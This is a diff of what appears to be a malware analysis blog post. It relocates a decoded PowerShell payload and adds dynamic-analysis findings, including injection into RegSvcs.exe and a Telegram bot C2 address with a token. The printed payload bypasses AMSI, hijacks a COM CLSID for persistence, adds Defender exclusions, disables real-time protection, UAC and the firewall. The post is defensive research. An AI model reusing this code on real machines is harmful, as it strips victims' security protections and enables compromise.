@@ -147,6 +147,70 @@ The script is comprised of 3 long strings of 0s and 1s, one of these strings lik
 
 I wasn't able to make much sense out of the first set of binary code ($muthal)
 
+The secondary blob contains our binary code, which we will review further shortly.
+
+The final blob decodes as below:
+
+``` powershell
+[Ref].("{0}" -f'Ass'+'em'+'bly').("{0}" -f'Ge'+'tT'+'ype')('System.Management.Automation.Ams'+'iUtils').("{0}" -f'Ge'+'tFi'+'eld')('am'+'siInitFailed','NonPu'+'blic,Static').("{0}" -f'Set'+'Val'+'ue')($null,$true)
+
+
+New-Item -P "HKCU:\Software\Classes\CLSID\" -N "{fdb00e52-a214-4aa1-8fba-4357bb0072ec}" -F
+New-Item -P "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\" -N "InProcServer32" -F
+New-ItemProperty -Path 'HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32' -N '(Default)' -V "C:\IDontExist.dll" -PropertyType String -Force
+if (-not ([Type]::GetType("AMSIReaper"))) {
+    Add-Type -TypeDefinition @"
+    using System; using System.Diagnostics; using System.Runtime.InteropServices;
+    public class AMSIReaper {
+        public const int PROCESS_VM_OPERATION = 0x0008, PROCESS_VM_READ = 0x0010, PROCESS_VM_WRITE = 0x0020;
+        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
+        [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
+        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    }
+"@
+}
+
+function ModAMSI($processId) {
+    # Function content remains the same
+}
+
+function ModAllPShells {
+    # Function content remains the same
+}
+
+Write-Host "AMSI do"
+
+
+$ErrorActionPreference = "SilentlyContinue" # Suppress errors globally
+
+# Add Exclusions
+$extensions = @('.ppam', '.xls', '.docx', '.vbs', '.js')
+$paths = @('C:\', 'D:\', 'E:\')
+$processes = @('explorer.exe', 'kernel32.dll', 'aspnet_compiler.exe', 'cvtres.exe', 'CasPol.exe', 'csc.exe', 'Msbuild.exe', 'ilasm.exe', 'InstallUtil.exe', 'jsc.exe', 'powershell.exe', 'rundll32.exe', 'conhost.exe', 'Cscript.exe', 'mshta.exe', 'cmd.exe', 'DefenderisasuckingAntivirus', 'wscript.exe')
+
+$extensions | ForEach-Object { Add-MpPreference -ExclusionExtension $_ -ErrorAction SilentlyContinue }
+$paths | ForEach-Object { Add-MpPreference -ExclusionPath $_ -ErrorAction SilentlyContinue }
+$processes | ForEach-Object { Add-MpPreference -ExclusionProcess $_ -ErrorAction SilentlyContinue }
+
+# Set Preferences and Disable Security Features (ensure this is run as admin)
+try {
+    Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection disable -HighThreatDefaultAction 6 -Force -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ScanScheduleDay 8 -ExclusionIpAddress 127.0.0.1 -ThreatIDDefaultAction_Actions 6 -AttackSurfaceReductionRules_Ids 0 -ErrorAction SilentlyContinue
+} catch {}
+
+# Registry, Service, and Firewall Changes (ensure this is run as admin)
+try {
+    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -PropertyType DWord -Value 0 -Force -ErrorAction SilentlyContinue
+    netsh advfirewall set allprofiles state off -ErrorAction SilentlyContinue
+} catch {}
+
+$ErrorActionPreference = "Continue" # Reset error action preference
+
+```
+
+This infers that COM object hijacking is being utilised as a means of persistence, under the Class ID 'fdb00e52-a214-4aa1-8fba-4357bb0072ec'
+
 The second, $bulgumchupitum, is as follows:
 
 ``` powershell
@@ -212,7 +276,7 @@ if (Test-Path $scriptPath) {
 }
 ```
 
-It appears that this is the code we are interested in to extract an executable, it looks like when this script is executed, the given bytes are executed in memory.
+It appears that this is the code we are interested in to extract an executable, it looks like when this script is executed, the given code is injected into RegSvcs.exe.
 
 We can manipulate the code to get the deobfuscated binary data and write the binary file to disk using CyberChef.
 
@@ -239,65 +303,23 @@ _Referneces to Protection:_
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e2d173aa-e5de-44db-8f95-cc07104df754)
 
-Going back to the PowerShell script from before, we can deobfuscate and decode the last binary string to reveal the following script:
+We'll revert to dynamic analysis to extract any IOCs from this binary.
 
-``` powershell
-[Ref].("{0}" -f'Ass'+'em'+'bly').("{0}" -f'Ge'+'tT'+'ype')('System.Management.Automation.Ams'+'iUtils').("{0}" -f'Ge'+'tFi'+'eld')('am'+'siInitFailed','NonPu'+'blic,Static').("{0}" -f'Set'+'Val'+'ue')($null,$true)
+Upon execution, one of the first notable things is that RegSvcs.exe (Our injected process) makes a network request to ip-api.com, which is fairly typical for a lot of malware families.
 
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/ad7d94c8-567e-4980-a8ac-6b20315210e5)
 
-New-Item -P "HKCU:\Software\Classes\CLSID\" -N "{fdb00e52-a214-4aa1-8fba-4357bb0072ec}" -F
-New-Item -P "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\" -N "InProcServer32" -F
-New-ItemProperty -Path 'HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32' -N '(Default)' -V "C:\IDontExist.dll" -PropertyType String -Force
-if (-not ([Type]::GetType("AMSIReaper"))) {
-    Add-Type -TypeDefinition @"
-    using System; using System.Diagnostics; using System.Runtime.InteropServices;
-    public class AMSIReaper {
-        public const int PROCESS_VM_OPERATION = 0x0008, PROCESS_VM_READ = 0x0010, PROCESS_VM_WRITE = 0x0020;
-        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
-        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
-        [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
-        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-    }
-"@
-}
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/328fec11-1bf0-483d-92a7-94f3a9d958c3)
 
-function ModAMSI($processId) {
-    # Function content remains the same
-}
+Further investigation of network traffic shows that requests are made towards the Telegram API domain.
 
-function ModAllPShells {
-    # Function content remains the same
-}
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/1962edb4-4c4f-4dcb-b35a-aa3bbac216ff)
 
-Write-Host "AMSI do"
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a7d6f3e3-a389-4c9f-a404-635fba0310c3)
+
+**C2: hxxps[://]api.telegram[.]org/bot6796626947:AAGohe-IHhj5LD7VpBLcRBukReMwBcOmiTo**
 
 
-$ErrorActionPreference = "SilentlyContinue" # Suppress errors globally
 
-# Add Exclusions
-$extensions = @('.ppam', '.xls', '.docx', '.vbs', '.js')
-$paths = @('C:\', 'D:\', 'E:\')
-$processes = @('explorer.exe', 'kernel32.dll', 'aspnet_compiler.exe', 'cvtres.exe', 'CasPol.exe', 'csc.exe', 'Msbuild.exe', 'ilasm.exe', 'InstallUtil.exe', 'jsc.exe', 'powershell.exe', 'rundll32.exe', 'conhost.exe', 'Cscript.exe', 'mshta.exe', 'cmd.exe', 'DefenderisasuckingAntivirus', 'wscript.exe')
 
-$extensions | ForEach-Object { Add-MpPreference -ExclusionExtension $_ -ErrorAction SilentlyContinue }
-$paths | ForEach-Object { Add-MpPreference -ExclusionPath $_ -ErrorAction SilentlyContinue }
-$processes | ForEach-Object { Add-MpPreference -ExclusionProcess $_ -ErrorAction SilentlyContinue }
-
-# Set Preferences and Disable Security Features (ensure this is run as admin)
-try {
-    Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection disable -HighThreatDefaultAction 6 -Force -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ScanScheduleDay 8 -ExclusionIpAddress 127.0.0.1 -ThreatIDDefaultAction_Actions 6 -AttackSurfaceReductionRules_Ids 0 -ErrorAction SilentlyContinue
-} catch {}
-
-# Registry, Service, and Firewall Changes (ensure this is run as admin)
-try {
-    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -PropertyType DWord -Value 0 -Force -ErrorAction SilentlyContinue
-    netsh advfirewall set allprofiles state off -ErrorAction SilentlyContinue
-} catch {}
-
-$ErrorActionPreference = "Continue" # Reset error action preference
-
-```
-
-This infers that COM object hijacking is being utilised as a means of persistence, under the Class ID 'fdb00e52-a214-4aa1-8fba-4357bb0072ec'
 
